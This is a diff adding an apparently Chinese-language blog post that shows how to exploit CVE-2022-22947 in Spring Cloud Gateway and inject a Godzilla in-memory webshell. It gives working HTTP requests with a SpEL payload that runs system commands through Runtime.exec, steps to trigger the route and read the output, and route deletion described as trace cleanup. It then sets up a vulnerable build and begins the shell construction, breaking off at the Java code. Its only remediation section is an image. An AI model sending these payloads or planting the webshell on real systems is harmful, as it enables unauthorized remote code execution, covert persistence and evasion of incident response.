@@ -1,0 +1,473 @@
+<!DOCTYPE html>
+<html lang=en>
+<head><!-- hexo injector head_begin start --><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.2/dist/css/bootstrap.min.css" crossorigin="anonymous"><!-- hexo injector head_begin end -->
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="Spring Cloud Gateway 内存马注入漏洞简介Spring Cloud Gateway 是基于 Spring Framework 和 Spring Boot 构建的 API 网关，它旨在为微服务架构提供一种简单、有效、统一的 API 路由管理方式以下版本的 Spring Cloud Gateway 存在 SpEL 表达式注入漏洞 CVE-2022-22947，可导致未授权远程命令执行">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Spring Cloud Gateway 内存马注入">
+<meta property="og:url" content="https://www.m1r0ku.com/posts/Spring-Cloud-Gateway-%E5%86%85%E5%AD%98%E9%A9%AC%E6%B3%A8%E5%85%A5.html">
+<meta property="og:site_name" content="M1r0ku">
+<meta property="og:description" content="Spring Cloud Gateway 内存马注入漏洞简介Spring Cloud Gateway 是基于 Spring Framework 和 Spring Boot 构建的 API 网关，它旨在为微服务架构提供一种简单、有效、统一的 API 路由管理方式以下版本的 Spring Cloud Gateway 存在 SpEL 表达式注入漏洞 CVE-2022-22947，可导致未授权远程命令执行">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://www.m1r0ku.com/assets/Spring-Cloud-Gateway-MemShell-0.png">
+<meta property="og:image" content="https://www.m1r0ku.com/assets/Spring-Cloud-Gateway-MemShell-1.png">
+<meta property="og:image" content="https://www.m1r0ku.com/assets/Spring-Cloud-Gateway-MemShell-2.png">
+<meta property="og:image" content="https://www.m1r0ku.com/assets/Spring-Cloud-Gateway-MemShell-3.png">
+<meta property="og:image" content="https://www.m1r0ku.com/assets/Spring-Cloud-Gateway-MemShell-4.png">
+<meta property="og:image" content="https://www.m1r0ku.com/assets/Spring-Cloud-Gateway-MemShell-5.png">
+<meta property="og:image" content="https://www.m1r0ku.com/assets/Spring-Cloud-Gateway-MemShell-6.png">
+<meta property="og:image" content="https://www.m1r0ku.com/assets/Spring-Cloud-Gateway-MemShell-7.png">
+<meta property="og:image" content="https://www.m1r0ku.com/assets/Spring-Cloud-Gateway-MemShell-8.png">
+<meta property="og:image" content="https://www.m1r0ku.com/assets/Spring-Cloud-Gateway-MemShell-9.png">
+<meta property="og:image" content="https://www.m1r0ku.com/assets/Spring-Cloud-Gateway-MemShell-10.png">
+<meta property="og:image" content="https://www.m1r0ku.com/assets/Spring-Cloud-Gateway-MemShell-11.png">
+<meta property="og:image" content="https://www.m1r0ku.com/assets/Spring-Cloud-Gateway-MemShell-12.png">
+<meta property="og:image" content="https://www.m1r0ku.com/assets/Spring-Cloud-Gateway-MemShell-13.png">
+<meta property="og:image" content="https://www.m1r0ku.com/assets/Spring-Cloud-Gateway-MemShell-14.png">
+<meta property="article:published_time" content="2022-06-30T04:46:00.000Z">
+<meta property="article:modified_time" content="2024-02-04T18:10:34.291Z">
+<meta property="article:author" content="M1r0ku">
+<meta property="article:tag" content="Spring">
+<meta property="article:tag" content="内存马">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://www.m1r0ku.com/assets/Spring-Cloud-Gateway-MemShell-0.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>Spring Cloud Gateway 内存马注入</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+      <link rel="alternate" href="/true" title="M1r0ku" type="application/atom+xml" />
+    
+	<!-- mathjax -->
+	
+
+  <!-- FancyBox -->
+  
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@4.0/dist/fancybox.css" crossorigin="anonymous" />
+  
+  
+<meta name="generator" content="Hexo 6.0.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/lists/">Lists</a></li><!--
+     --><!--
+       --><li><a href="/links/">Links</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/posts/Go%E5%85%8D%E6%9D%80%E5%88%9D%E6%8E%A2.html"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://www.m1r0ku.com/posts/Spring-Cloud-Gateway-%E5%86%85%E5%AD%98%E9%A9%AC%E6%B3%A8%E5%85%A5.html"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://www.m1r0ku.com/posts/Spring-Cloud-Gateway-%E5%86%85%E5%AD%98%E9%A9%AC%E6%B3%A8%E5%85%A5.html&text=Spring Cloud Gateway 内存马注入"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://www.m1r0ku.com/posts/Spring-Cloud-Gateway-%E5%86%85%E5%AD%98%E9%A9%AC%E6%B3%A8%E5%85%A5.html&title=Spring Cloud Gateway 内存马注入"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://www.m1r0ku.com/posts/Spring-Cloud-Gateway-%E5%86%85%E5%AD%98%E9%A9%AC%E6%B3%A8%E5%85%A5.html&is_video=false&description=Spring Cloud Gateway 内存马注入"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Spring Cloud Gateway 内存马注入&body=Check out this article: https://www.m1r0ku.com/posts/Spring-Cloud-Gateway-%E5%86%85%E5%AD%98%E9%A9%AC%E6%B3%A8%E5%85%A5.html"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://www.m1r0ku.com/posts/Spring-Cloud-Gateway-%E5%86%85%E5%AD%98%E9%A9%AC%E6%B3%A8%E5%85%A5.html&title=Spring Cloud Gateway 内存马注入"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://www.m1r0ku.com/posts/Spring-Cloud-Gateway-%E5%86%85%E5%AD%98%E9%A9%AC%E6%B3%A8%E5%85%A5.html&title=Spring Cloud Gateway 内存马注入"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://www.m1r0ku.com/posts/Spring-Cloud-Gateway-%E5%86%85%E5%AD%98%E9%A9%AC%E6%B3%A8%E5%85%A5.html&title=Spring Cloud Gateway 内存马注入"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://www.m1r0ku.com/posts/Spring-Cloud-Gateway-%E5%86%85%E5%AD%98%E9%A9%AC%E6%B3%A8%E5%85%A5.html&title=Spring Cloud Gateway 内存马注入"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://www.m1r0ku.com/posts/Spring-Cloud-Gateway-%E5%86%85%E5%AD%98%E9%A9%AC%E6%B3%A8%E5%85%A5.html&name=Spring Cloud Gateway 内存马注入&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://www.m1r0ku.com/posts/Spring-Cloud-Gateway-%E5%86%85%E5%AD%98%E9%A9%AC%E6%B3%A8%E5%85%A5.html&t=Spring Cloud Gateway 内存马注入"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Spring-Cloud-Gateway-%E5%86%85%E5%AD%98%E9%A9%AC%E6%B3%A8%E5%85%A5"><span class="toc-number">1.</span> <span class="toc-text">Spring Cloud Gateway 内存马注入</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E7%AE%80%E4%BB%8B"><span class="toc-number">1.1.</span> <span class="toc-text">漏洞简介</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">1.2.</span> <span class="toc-text">漏洞利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="toc-number">1.2.1.</span> <span class="toc-text">漏洞复现</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D"><span class="toc-number">1.2.2.</span> <span class="toc-text">漏洞修复</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%93%A5%E6%96%AF%E6%8B%89%E5%86%85%E5%AD%98%E9%A9%AC"><span class="toc-number">1.3.</span> <span class="toc-text">哥斯拉内存马</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83"><span class="toc-number">1.3.1.</span> <span class="toc-text">环境</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9E%84%E9%80%A0"><span class="toc-number">1.3.2.</span> <span class="toc-text">构造</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%A8%E5%85%A51"><span class="toc-number">1.3.3.</span> <span class="toc-text">注入1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%A8%E5%85%A52"><span class="toc-number">1.3.4.</span> <span class="toc-text">注入2</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0"><span class="toc-number">1.4.</span> <span class="toc-text">参考文章</span></a></li></ol></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        Spring Cloud Gateway 内存马注入
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">M1r0ku</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2022-06-30T04:46:00.000Z" itemprop="datePublished">2022-06-30</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/Java/">Java</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/Spring/" rel="tag">Spring</a>, <a class="tag-link-link" href="/tags/%E5%86%85%E5%AD%98%E9%A9%AC/" rel="tag">内存马</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h1 id="Spring-Cloud-Gateway-内存马注入"><a href="#Spring-Cloud-Gateway-内存马注入" class="headerlink" title="Spring Cloud Gateway 内存马注入"></a>Spring Cloud Gateway 内存马注入</h1><h2 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><p>Spring Cloud Gateway 是基于 Spring Framework 和 Spring Boot 构建的 API 网关，它旨在为微服务架构提供一种简单、有效、统一的 API 路由管理方式<br>以下版本的 Spring Cloud Gateway 存在 SpEL 表达式注入漏洞 CVE-2022-22947，可导致未授权远程命令执行漏洞</p>
+<p>漏洞信息：CVE-2022-22947</p>
+<p>利用版本：</p>
+<ul>
+<li>Spring Cloud Gateway 3.1.x &lt; 3.1.1</li>
+<li>Spring Cloud Gateway 3.0.x &lt; 3.0.7</li>
+<li>Spring Cloud Gateway 其他已不再更新的版本</li>
+</ul>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>发送恶意请求，创建路由及编写 SpEL 表达式</p>
+<ul>
+<li><code>id</code>字段指定新路由名称，必须唯一</li>
+<li><code>filters</code>字段给这条路由指定若干个过滤器，过滤器用于对请求和响应进行修改<ul>
+<li><code>name</code>字段指定要添加的过滤器，这里添加了一个<code>AddResponseHeader</code> 过滤器，用于<code>gateway</code>给客户端返回响应之前添加一个响应头</li>
+<li><code>args.name</code>字段指定要添加的响应头</li>
+<li><code>args.value</code>字段指定响应头的值。这里的值是要执行的 SpEL 表达式，用于执行 whoami 命令。注意需要将命令输出结尾的换行符去掉，否则过滤器执行时会抛出异常说「响应头的值不能以 \r 或 \n 结尾」</li>
+<li><code>uri</code>字段指定将客户端请求转发到<code>http://example.com</code></li>
+</ul>
+</li>
+</ul>
+<figure class="highlight http"><i class="fas fa-laptop-code" type="button" data-toggle="collapse" data-target="#collapse-0m7040ls7tkuws"></i><span>  Http  </span><div class="collapse show" id="collapse-0m7040ls7tkuws"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/actuator/gateway/routes/hacktest</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>&lt;IP:Port&gt;</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>en</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>329</span><br><span class="line"></span><br><span class="line"><span class="language-coffeescript">&#123;</span></span><br><span class="line"><span class="language-coffeescript">  <span class="string">&quot;id&quot;</span>: <span class="string">&quot;hacktest&quot;</span>,</span></span><br><span class="line"><span class="language-coffeescript">  <span class="string">&quot;filters&quot;</span>: [&#123;</span></span><br><span class="line"><span class="language-coffeescript">    <span class="string">&quot;name&quot;</span>: <span class="string">&quot;AddResponseHeader&quot;</span>,</span></span><br><span class="line"><span class="language-coffeescript">    <span class="string">&quot;args&quot;</span>: &#123;</span></span><br><span class="line"><span class="language-coffeescript">      <span class="string">&quot;name&quot;</span>: <span class="string">&quot;Result&quot;</span>,</span></span><br><span class="line"><span class="language-coffeescript">      <span class="string">&quot;value&quot;</span>: <span class="string">&quot;<span class="subst">#&#123;<span class="keyword">new</span> <span class="built_in">String</span>(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(<span class="keyword">new</span> <span class="built_in">String</span>[]&#123;\<span class="string">&quot;id\&quot;&#125;).getInputStream()))&#125;&quot;</span></span></span></span></span><br><span class="line"><span class="subst"><span class="string"><span class="language-coffeescript">    &#125;</span></span></span></span><br><span class="line"><span class="string"><span class="language-coffeescript">  &#125;],</span></span></span><br><span class="line"><span class="string"><span class="language-coffeescript">  &quot;</span>uri<span class="string">&quot;: &quot;</span>http://example.com<span class="string">&quot;</span></span></span><br><span class="line"><span class="string"><span class="language-coffeescript">&#125;</span></span></span><br><span class="line"><span class="string"><span class="language-coffeescript"></span></span></span><br></pre></td></tr></table></div></figure>
+<p><a data-fancybox="gallery" data-src="/assets/Spring-Cloud-Gateway-MemShell-0.png" data-caption="Spring-Cloud-Gateway-MemShell-0"><img src="/assets/Spring-Cloud-Gateway-MemShell-0.png" alt="Spring-Cloud-Gateway-MemShell-0"></a></p>
+<p>刷新路由，此时将触发并执行 SpEL 表达式。需要注意的是，请求体中需要空一行，否则发送后会一直<code>waitting</code>，下同</p>
+<figure class="highlight http"><i class="fas fa-laptop-code" type="button" data-toggle="collapse" data-target="#collapse-rtn8mels7tkuws"></i><span>  Http  </span><div class="collapse show" id="collapse-rtn8mels7tkuws"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/actuator/gateway/refresh</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>&lt;IP:Port&gt;</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>en</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>0</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></div></figure>
+<p><a data-fancybox="gallery" data-src="/assets/Spring-Cloud-Gateway-MemShell-1.png" data-caption="Spring-Cloud-Gateway-MemShell-1"><img src="/assets/Spring-Cloud-Gateway-MemShell-1.png" alt="Spring-Cloud-Gateway-MemShell-1"></a></p>
+<p>查看执行结果</p>
+<figure class="highlight http"><i class="fas fa-laptop-code" type="button" data-toggle="collapse" data-target="#collapse-2yizvpls7tkuws"></i><span>  Http  </span><div class="collapse show" id="collapse-2yizvpls7tkuws"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/actuator/gateway/routes/hacktest</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>&lt;IP:Port&gt;</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>en</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>0</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></div></figure>
+<p><a data-fancybox="gallery" data-src="/assets/Spring-Cloud-Gateway-MemShell-2.png" data-caption="Spring-Cloud-Gateway-MemShell-2"><img src="/assets/Spring-Cloud-Gateway-MemShell-2.png" alt="Spring-Cloud-Gateway-MemShell-2"></a></p>
+<p>最后可以删除所添加的路由，进行痕迹清理</p>
+<figure class="highlight http"><i class="fas fa-laptop-code" type="button" data-toggle="collapse" data-target="#collapse-vcqmisls7tkuwt"></i><span>  Http  </span><div class="collapse show" id="collapse-vcqmisls7tkuwt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">DELETE</span> <span class="string">/actuator/gateway/routes/hacktest</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>&lt;IP:Port&gt;</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>en</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br></pre></td></tr></table></div></figure>
+<p><a data-fancybox="gallery" data-src="/assets/Spring-Cloud-Gateway-MemShell-3.png" data-caption="Spring-Cloud-Gateway-MemShell-3"><img src="/assets/Spring-Cloud-Gateway-MemShell-3.png" alt="Spring-Cloud-Gateway-MemShell-3"></a></p>
+<p>最后刷新下路由</p>
+<figure class="highlight http"><i class="fas fa-laptop-code" type="button" data-toggle="collapse" data-target="#collapse-ni19k4ls7tkuwt"></i><span>  Http  </span><div class="collapse show" id="collapse-ni19k4ls7tkuwt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/actuator/gateway/refresh</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>&lt;IP:Port&gt;</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>en</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>0</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></div></figure>
+<p><a data-fancybox="gallery" data-src="/assets/Spring-Cloud-Gateway-MemShell-4.png" data-caption="Spring-Cloud-Gateway-MemShell-4"><img src="/assets/Spring-Cloud-Gateway-MemShell-4.png" alt="Spring-Cloud-Gateway-MemShell-4"></a></p>
+<h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p><a data-fancybox="gallery" data-src="/assets/Spring-Cloud-Gateway-MemShell-5.png" data-caption="Spring-Cloud-Gateway-MemShell-5"><img src="/assets/Spring-Cloud-Gateway-MemShell-5.png" alt="Spring-Cloud-Gateway-MemShell-5"></a></p>
+<h2 id="哥斯拉内存马"><a href="#哥斯拉内存马" class="headerlink" title="哥斯拉内存马"></a>哥斯拉内存马</h2><h3 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h3><p>创建Maven项目，引入依赖</p>
+<figure class="highlight xml"><i class="fas fa-laptop-code" type="button" data-toggle="collapse" data-target="#collapse-05p30rls7tkuwt"></i><span>  Xml  </span><div class="collapse show" id="collapse-05p30rls7tkuwt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.cloud<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-cloud-starter-gateway<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.0.6<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></div></figure>
+
+<h3 id="构造"><a href="#构造" class="headerlink" title="构造"></a>构造</h3><blockquote>
+<p>这里使用 <a target="_blank" rel="noopener" href="https://github.com/whwlsfb/cve-2022-22947-godzilla-memshell/blob/main/GMemShell.java">GMemShell.java</a> 哥斯拉内存马，具体分析文章参考：<a target="_blank" rel="noopener" href="https://blog.wanghw.cn/tech-share/cve-2022-22947-inject-godzilla-memshell.html">CVE-2022-22947 注入哥斯拉内存马</a></p>
+</blockquote>
+<p>构造内存马，设置变量<code>pass</code>及<code>key</code>，另外<code>doInject</code>方法传入的<code>path</code>参数为木马路径</p>
+<p>此处<code>key</code>是明文<code>testpwd</code>的<strong>MD5值前16位</strong></p>
+<figure class="highlight shell"><i class="fas fa-laptop-code" type="button" data-toggle="collapse" data-target="#collapse-tdnwwsls7tkuwt"></i><span>  Shell  </span><div class="collapse show" id="collapse-tdnwwsls7tkuwt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">echo</span> -n <span class="string">&quot;testpwd&quot;</span> | md5 | <span class="built_in">cut</span> -c 1-16</span></span><br><span class="line"></span><br></pre></td></tr></table></div></figure>
+
+
+
+<figure class="highlight java"><i class="fas fa-laptop-code" type="button" data-toggle="collapse" data-target="#collapse-cnv525ls7tkuwt"></i><span>  Java  </span><div class="collapse show" id="collapse-cnv525ls7tkuwt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span 